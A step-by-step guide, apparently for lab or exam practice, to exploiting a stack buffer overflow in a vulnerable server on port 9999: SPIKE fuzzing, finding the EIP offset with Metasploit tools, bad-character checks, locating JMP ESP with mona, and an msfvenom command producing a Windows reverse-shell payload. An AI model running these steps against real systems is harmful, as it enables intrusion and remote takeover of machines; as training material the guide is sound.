# Buffer overflow guide

## SPIKE
Spike the target using ```generic_send_tcp 192.168.1.107 9999 test.spk 0 0```
	-example spike-
	```s_readline();
	s_string("STATS ");
	s_string_variable("FUZZ");
	```
## Fuzzing
1. Once we have located a vulnerable command, we need to find the break point
	Utilize the ```1_fuzz.py``` script to test for the breaking point of the server

## Finding the offset
1. Use ```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2900```
	**-l** length // Use a length close to where your program crashed
2. Start ```2_offset.py``` to discover the offset at which the program crashes at
3. Run ```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2900 -q 386F4337```
	**-l** length // Same as above
	**-q** EIP from offset.py
4. You should now have an exact match for the pattern offset

## Overwriting the EIP
1. Modify ```3_overwrite.py``` using the offset discovered from ```2_offset.py``` 
2. You should now see your EIP holding the 4 bytes added by ```2_offset.py```

## Find those bad characters
1. Fire the ```4_badchars.py``` script, making sure to edit the proper variables
2. When the program terminates, follow the ESP dump
3. You must now check visually for bad characters, and remember them
	* You will include these for shellcode generation!

## Locating modules via MONA
1. Within immunity, run the ```!mona modules``` command, you will be searching for a .dll or an .exe that has **false** across the board.
2. Look for a JMP ESP using ```jmp -r ESP -m essfunc.dll```
	* Replace "essfunc.dll" with a module found from step 1.
3. Follow the address into CPU view, then enter **F2** to create a breakpoint
	* Execute ```5_mona.py```, changing the addr in into LITTLE ENDIAN format
	* Your address should now be reflected in your **EIP**

## Create the shellcode / gain shell
1. Run ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.245 LPORT=5555 EXITFUNC=thread -f python -a x86 -b "\x00"```
	* **-b** bad characters discovered earlier
2. Execute ```6_shellcode.py``` to spawn a shell :^)

# Aditional information

Change the working config of mona
* ```!mona config -set workingfolder c:\mona```

## Automate bad chars
1. Create a bad character list 
	```!mona bytearray -cpb "\x00"```
2. Compare to our array.bin
	```!mona compare -f c:\mona\bytearray.bin <address>```
	* The address will be your ESP after running ```4_badchars.py```
	